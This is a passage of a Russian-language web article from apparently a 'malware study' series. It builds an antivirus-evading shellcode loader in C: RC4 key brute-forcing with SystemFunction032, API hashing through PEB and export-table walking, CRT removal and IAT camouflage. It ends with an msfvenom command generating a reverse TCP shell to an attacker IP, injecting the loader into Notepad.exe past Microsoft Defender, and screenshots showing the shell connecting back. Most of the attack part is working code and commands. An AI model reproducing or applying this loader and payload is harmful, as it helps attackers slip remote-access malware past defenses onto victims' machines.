        // Используя намек байта, если это равно, то мы нашли значение &#039;b&#039;, необходимое для расшифровки ключа
        if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
            break;
        // В противном случае увеличиваем &#039;b&#039; и пытаемся снова
        else
            b++;
    }

    printf(&quot;[i] Рассчитанное значение &#039;b&#039; : 0x%0.2X \n&quot;, b);

    // Расшифровка ключа
    for (int i = 0; i &lt; KEY_SIZE; i++) {
        RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
    }

    // Создание 2 переменных типа USTRING, одна передается в качестве ключа, а другая - в качестве блока данных для шифрования/расшифровки
    USTRING Key = { .Buffer = RealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },
            Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };


    // Поскольку функция SystemFunction032 экспортируется из Advapi32.dll, мы загружаем ее в процесс с помощью Advapi32,
    // И используем ее возвращаемое значение в качестве параметра hModule в GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);

    // Если вызовы SystemFunction032 завершаются неудачно, они вернут ненулевое значение
    if ((STATUS = SystemFunction032(&amp;Img, &amp;Key)) != 0x0) {
        printf(&quot;[!] ОШИБКА SystemFunction032 : 0x%0.8X\n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}
}</code></pre>
	</div>
</div><br />
<b>Результаты взлома методом перебора</b><br />
<br />
Выполнение полезной нагрузки (функции анти-анализа отключены).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788250754.png"
		data-src="https://osint42.org/attachments/1746788250754-png.267/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788250754-png.267/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788250754.png"
			title="1746788250754.png"
			width="1604" height="580" loading="lazy" />
	</div><br />
<br />
<b>Хэширование API</b><br />
<br />
До сих пор все использованные WinAPI вызывались напрямую, что означает, что их можно найти в IAT реализации. Чтобы решить эту проблему, создается новый файл, ApiHashing.c, который содержит необходимые функции для реализации хэширования API.<br />
<br />
ApiHashing.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

    if (hModule == NULL || dwApiNameHash == NULL)
        return NULL;

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER       pImgDosHdr       = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS       pImgNtHdrs       = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER   ImgOptHdr        = pImgNtHdrs-&gt;OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir    = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD            FunctionNameArray       = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
    PDWORD            FunctionAddressArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
    PWORD            FunctionOrdinalArray    = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID    pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // Хэшируем каждое имя функции `pFunctionName`
        // Если оба хэша равны, то мы нашли нужную функцию
        if (dwApiNameHash == HASHA(pFunctionName)) {
            return pFunctionAddress;
        }
    }

    return NULL;
}

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

    if (dwModuleNameHash == NULL)
        return NULL;

#ifdef _WIN64
    PPEB            pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB            pPeb = (PEB*)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA            pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
    PLDR_DATA_TABLE_ENTRY    pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

    while (pDte) {

        if (pDte-&gt;FullDllName.Length != NULL &amp;&amp; pDte-&gt;FullDllName.Length &lt; MAX_PATH) {

            // Преобразование `FullDllName.Buffer` в строку верхнего регистра
            CHAR UpperCaseDllName[MAX_PATH];

            DWORD i = 0;
            while (pDte-&gt;FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte-&gt;FullDllName.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = &#039;\0&#039;;

            // Хэшируем `UpperCaseDllName` и сравниваем значение хэша с входным `dwModuleNameHash`
            if (HASHA(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
        }
        else {
            break;
        }

        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    return NULL;
}</code></pre>
	</div>
</div><br />
<b>Файл заголовка</b><br />
<br />
Перед продолжением необходимо создать новый файл заголовка, typedef.h, чтобы определить используемые WinAPI в виде указателей на функции для ясности и возможности поддержки. Common.h будет необходимо включить файл заголовка typedef.h с помощью #include &quot;typedef.h&quot;.<br />
<br />
typedef.h<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once
#include &lt;Windows.h&gt;
typedef ULONGLONG(WINAPI* fnGetTickCount64)();

typedef HANDLE(WINAPI* fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

typedef LRESULT(WINAPI* fnCallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);

typedef HHOOK(WINAPI* fnSetWindowsHookExW)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);

typedef BOOL(WINAPI* fnGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);

typedef LRESULT(WINAPI* fnDefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

typedef BOOL(WINAPI* fnUnhookWindowsHookEx)(HHOOK hhk);

typedef DWORD(WINAPI* fnGetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);

typedef HANDLE(WINAPI* fnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef BOOL(WINAPI* fnSetFileInformationByHandle)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);

typedef BOOL(WINAPI* fnCloseHandle)(HANDLE hObject);</code></pre>
	</div>
</div><br />
<b>Структура API_HASHING</b><br />
<br />
Далее в Common.h определяется новая структура API_HASHING, которая используется для хранения адресов используемых WinAPI, делая их более доступными для использования в функциях реализации.<br />
<br />
Common.h<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _API_HASHING {

    fnGetTickCount64                pGetTickCount64;
    fnOpenProcess                   pOpenProcess;
    fnCallNextHookEx                pCallNextHookEx;
    fnSetWindowsHookExW             pSetWindowsHookExW;
    fnGetMessageW                   pGetMessageW;
    fnDefWindowProcW                pDefWindowProcW;
    fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
    fnGetModuleFileNameW            pGetModuleFileNameW;
    fnCreateFileW                   pCreateFileW;
    fnSetFileInformationByHandle    pSetFileInformationByHandle;
    fnCloseHandle                   pCloseHandle;

} API_HASHING, *PAPI_HASHING;</code></pre>
	</div>
</div><br />
<b>Обновление VX_Table </b><br />
<br />
Функции GetModuleHandleH и GetProcAddressH должны быть использованы для инициализации элементов структуры API_HASHING. Затем функция InitializeSyscalls использует эти функции для инициализации структуры VX_TABLE, которая используется для вызова syscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// ...

API_HASHING g_Api = {0};

BOOL InitializeSyscalls() {

// Получить PEB
PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
    return FALSE;

// Получить модуль NTDLL
PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

// Получить EAT из NTDLL
PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
    return FALSE;

g_Sys.NtCreateSection.uHash          = NtCreateSection_JOAA;
g_Sys.NtMapViewOfSection.uHash       = NtMapViewOfSection_JOAA;
g_Sys.NtUnmapViewOfSection.uHash     = NtUnmapViewOfSection_JOAA;
g_Sys.NtClose.uHash                  = NtClose_JOAA;
g_Sys.NtCreateThreadEx.uHash         = NtCreateThreadEx_JOAA;
g_Sys.NtWaitForSingleObject.uHash    = NtWaitForSingleObject_JOAA;
g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
g_Sys.NtDelayExecution.uHash         = NtDelayExecution_JOAA;

// Инициализировать syscalls
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtQuerySystemInformation))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtDelayExecution))
    return FALSE;

// Экспортированный User32.dll
g_Api.pCallNextHookEx      = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
g_Api.pDefWindowProcW      = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
g_Api.pGetMessageW         = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
g_Api.pSetWindowsHookExW   = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
    return FALSE;

// Экспортированный Kernel32.dll
g_Api.pGetModuleFileNameW          = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
g_Api.pCloseHandle                 = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
g_Api.pCreateFileW                 = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
g_Api.pGetTickCount64              = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
g_Api.pOpenProcess                 = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
g_Api.pSetFileInformationByHandle  = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
    return FALSE;

return TRUE;
}</code></pre>
	</div>
</div><br />
Хеши WinAPI генерируются проектом Hasher, как показано ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788266390.png"
		data-src="https://osint42.org/attachments/1746788266390-png.268/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788266390-png.268/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788266390.png"
			title="1746788266390.png"
			width="1099" height="445" loading="lazy" />
	</div><br />
<br />
Следующий шаг - использовать структуру g_Api для вызова всех функций WinAPI, добавив перед каждой из них префикс g_Api.&lt;WinAPI&gt;. Например, функция OpenProcess должна вызываться как g_Api.pOpenProcess.<br />
<br />
<b>Ошибка хеширования API SystemFunction032</b><br />
<br />
При попытке применить хеширование API к функции SystemFunction032 (которая не включена в структуру g_Api), произойдет следующее исключение.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788273799.png"
		data-src="https://osint42.org/attachments/1746788273799-png.269/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788273799-png.269/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788273799.png"
			title="1746788273799.png"
			width="1371" height="345" loading="lazy" />
	</div><br />
<br />
При попытке выполнить SystemFunction032 по адресу 0x00007FFC42C09FF2 выбрасывается исключение. Похоже, это действительный адрес, так как он извлекается с помощью следующей строки кода:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA(&quot;Advapi32&quot;), SystemFunction032_JOAA);</code></pre>
	</div>
</div><br />
Используйте xdbg, чтобы проверить адрес и понять причину проблемы<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788282045.png"
		data-src="https://osint42.org/attachments/1746788282045-png.270/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788282045-png.270/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788282045.png"
			title="1746788282045.png"
			width="1242" height="187" loading="lazy" />
	</div><br />
<br />
<b>Функции переадресации</b><br />
<br />
Адрес, полученный с помощью GetProcAddressH, не указывает на функцию, а указывает на строку &quot;CRYPTSP.SystemFunction032&quot;. Это указывает на наличие функции переадресации, когда функция, экспортированная из одной DLL (DLL A), находится в другой DLL (DLL B).<br />
<br />
Таким образом, вместо загрузки Advapi32.dll (DLL A) для поиска SystemFunction032 следует загрузить Cryptsp.dll (DLL B), так как он содержит фактический адрес. Это указывается строкой &quot;CRYPTSP.SystemFunction032&quot;, которая дает намек на расположение функции. Это необходимо, потому что GetProcAddressH не обрабатывает функции переадресации. Внесением этого незначительного изменения код теперь будет успешно компилироваться и выполняться.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788289654.png"
		data-src="https://osint42.org/attachments/1746788289654-png.271/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788289654-png.271/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788289654.png"
			title="1746788289654.png"
			width="1649" height="614" loading="lazy" />
	</div><br />
<br />
<b>Удаление библиотеки CRT</b><br />
<br />
Следуя инструкциям, описанным в Уменьшение вероятности детекта зверька | Цикл статей &quot;Изучение вредоносных программ&quot;, можно удалить библиотеку CRT.<br />
<br />
Ошибка возникнет из-за использования функций printf и wprintf. Чтобы решить эту проблему, можно использовать пользовательскую функцию для замены этих функций. Функциональность печати будет включена только при включенном режиме отладки. Замены функций printf и wprintf следует сохранить в новом файле с именем Debug.h, который должен быть включен во все файлы, которые вызывают printf или wprintf.<br />
<br />
<b>Debug.h:</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once#include &lt;Windows.h&gt;// uncomment to enable debug mode
//\
#define DEBUG



#ifdef DEBUG// wprintf replacement
#define PRINTW( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  // printf replacement
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  #endif // DEBUG</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Only print if debug mode is enabled
#ifdef DEBUGPRINTA(&quot;...&quot;);
#endif</code></pre>
	</div>
</div><br />
Если попытаться скомпилировать после этого, появятся другие ошибки, потому что функции memcpy, memset, toupper также импортируются из библиотеки CRT. Чтобы исправить эту проблему, необходимо добавить пользовательские функции, которые будут выполнять ту же логику. Эти функции должны быть сохранены в файле WinApi.c, который показан ниже.<br />
<br />
<b>WinApi.c</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>CHAR _toUpper(CHAR C)
{
    if (C &gt;= &#039;a&#039; &amp;&amp; C &lt;= &#039;z&#039;)
        return C - &#039;a&#039; + &#039;A&#039;;

    return C;
}

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
    for (volatile int i = 0; i &lt; Size; i++) {
        ((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
    }
    return Destination;
}

extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)#pragma function(memset)void* __cdecl memset(void* Destination, int Value, size_t Size) {
    unsigned char* p = (unsigned char*)Destination;
    while (Size &gt; 0) {
        *p = (unsigned char)Value;
        p++;
        Size--;
    }
    return Destination;
}</code></pre>
	</div>
</div><br />
Есть еще одна ошибка, которую нужно решить: неопределенный символ _fltused. Символ _fltused - это глобальная переменная в библиотеке CRT, которая используется для определения, были ли в программе использованы операции с плавающей запятой. Создав новую переменную с именем _fltused и установив ее значение на ноль, ошибка будет исправлена. Это отражает инициализацию переменной библиотекой CRT, что приведет к тому, что компилятор построит проект без ошибок.<br />
<br />
<b>Камуфляж IAT</b><br />
<br />
В качестве последнего шага следует добавить заголовочный файл IatCamouflage.h, который содержит тот же код, что представлен тут Уменьшение вероятности детекта зверька | Цикл статей &quot;Изучение вредоносных программ&quot;.<br />
<br />
IatCamouflage.h должен быть включен только в файл main.c и вызван в начале основной функции, чтобы таблица адресов импорта реализации выглядела добросовестно.<br />
<br />
<b>Финальный результат</b><br />
<br />
Эта демонстрация использует обратный TCP-шелл от Msfvenom, который генерируется с помощью команды, представленной ниже.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin</code></pre>
	</div>
</div><br />
IAT AV.exe показан ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788838402.png"
		data-src="https://osint42.org/attachments/1746788838402-png.307/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788838402-png.307/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788838402.png"
			title="1746788838402.png"
			width="1279" height="756" loading="lazy" />
	</div><br />
<br />
Далее AV.exe внедряется в Notepad.exe с включенным Microsoft Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788846084.png"
		data-src="https://osint42.org/attachments/1746788846084-png.308/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788846084-png.308/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788846084.png"
			title="1746788846084.png"
			width="1920" height="992" loading="lazy" />
	</div><br />
<br />
Успешное обратное соединение устанавливается с атакующей машиной, и выполняется демонстрационная команда.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788869984.png"
		data-src="https://osint42.org/attachments/1746788869984-png.309/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788869984-png.309/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788869984.png"
			title="1746788869984.png"
			width="1444" height="817" loading="lazy" />
	</div><br />
<br />
Процесс Notepad.exe имеет PID 20288, который совпадает с PID на предыдущем изображении.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788877409.png"
		data-src="https://osint42.org/attachments/1746788877409-png.310/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746788877409-png.310/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788877409.png"
			title="1746788877409.png"
			width="1444" height="537" loading="lazy" />
	</div></div>
					
										

					
						<div style="padding-top: 10px;">
							
														
									<dl class="blockStatus blockStatus--info blockStatus--standalone">
										<dt></dt>
										<dd class="blockStatus-message amsNextPage">
											<span class="">Следующая страница цикла:</span>
											<a href="../pro-endpoint-detection-and-response-edr.36/index.html" class="" title="Про Endpoint Detection and Response (EDR)">Про Endpoint Detection and Response (EDR)</a>
										</dd>
									</dl>
								

								

														
									<dl class="blockStatus blockStatus--info blockStatus--standalone">
										<dt></dt>
										<dd class="blockStatus-message amsPreviousPage">
											<span class="">Предыдущая статья цикла:</span>
											<a href="../umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="" title="Уменьшение вероятности детекта зверька">Уменьшение вероятности детекта зверька</a>
										</dd>
									</dl>
								
							

							
						</div>
					

					
						

						
					

					

					<div class="reactionsBar js-reactionsList ">
						
					</div>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</article>
			</div>
		</div>
	</div>
	
	
</div>










	<div class="columnContainer"
		data-xf-init="lightbox"
		data-lb-id="article-6"
		data-lb-universal="0">

		<span class="u-anchorTarget" id="comments"></span>

		<div class="columnContainer-comments">
			
	
	

	<div class="block block--messages"
		data-xf-init=""
		data-type="ams_comment"
		data-href="/inline-mod/">

		
	
	


		<div class="block-outer"></div>
		
		<div class="block-container"
			data-xf-init="select-to-quote"
			data-message-selector=".js-comment">
			
			<h3 class="block-header">Комментарии</h3>
			<div class="block-body js-replyNewCommentContainer">
				
					<span class="u-anchorTarget" id="comments"></span>
					
						
							
	
	

	<article class="message message--simple message--comment js-comment js-inlineModContainer"
		data-author="vivty"
		data-content="ams-comment-25"
		id="js-comment-25">

		<span class="u-anchorTarget" id="ams-comment-25"></span>

		<div class="message-inner">
			<div class="message-cell message-cell--user">
				
	<header class="message-user"
		
		itemscope itemtype="https://schema.org/Person"
		itemid="https://osint42.org/members/vivty.94/">

		
			<meta itemprop="name" content="vivty" />
			
				<meta itemprop="url" content="https://osint42.org/members/vivty.94/" />
			
		

		<div class="message-avatar">
			<div class="message-avatar-wrapper">
				<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--s avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
		</a>
			</div>
		</div>
		<span class="message-userArrow"></span>
	</header>

			</div>
			<div class="message-cell message-cell--main">
				<div class="js-quickEditTarget">
					<div class="message-content js-messageContent">
						<header class="message-attribution message-attribution--plain">
							<ul class="listInline listInline--bullet">
								<li class="message-attribution-user">
									<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--xxs avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
		</a>
									<h4 class="attribution"><a href="https://osint42.org/members/vivty.94/" class="username " dir="auto" data-user-id="94" data-xf-init="member-tooltip"><span class="username--style2">vivty</span></a></h4>
								</li>
								<li>
									<a href="../../../comments/25/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-12T18:12:34+0300" data-timestamp="1749741154" data-date="12.06.2025" data-time="18:12" data-short="12 Июн" title="12.06.2025 в 18:12">12.06.2025</time></a>
								</li>
							</ul>
						</header>

						
						
						

						<div class="message-userContent lbContainer js-lbContainer"
							data-lb-id="ams-comment-25"
							data-lb-caption-desc="vivty &middot; 12.06.2025 в 18:12">

							<article class="message-body js-selectToQuote">
								<div class="bbWrapper">Отличные статьи.<br />
Спасибо!</div>
								<div class="js-selectToQuoteEnd">&nbsp;</div>
							</article>

							
						</div>

						

						
							
	

						
					</div>

					<footer class="message-footer">
						

						<div class="reactionsBar js-reactionsList ">
							
						</div>
					</footer>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</div>
			</div>
		</div>
	</article>

						
					
						
							
	
	

	<article class="message message--simple message--comment js-comment js-inlineModContainer"
		data-author="HMCoba"
		data-content="ams-comment-27"
		id="js-comment-27">

		<span class="u-anchorTarget" id="ams-comment-27"></span>

		<div class="message-inner">
			<div class="message-cell message-cell--user">
				
	<header class="message-user"
		
		itemscope itemtype="https://schema.org/Person"
		itemid="https://osint42.org/members/hmcoba.102/">

		
			<meta itemprop="name" content="HMCoba" />
			
				<meta itemprop="url" content="https://osint42.org/members/hmcoba.102/" />
			
		

		<div class="message-avatar">
			<div class="message-avatar-wrapper">
				<a href="https://osint42.org/members/hmcoba.102/" class="avatar avatar--s" data-user-id="102" data-xf-init="member-tooltip">
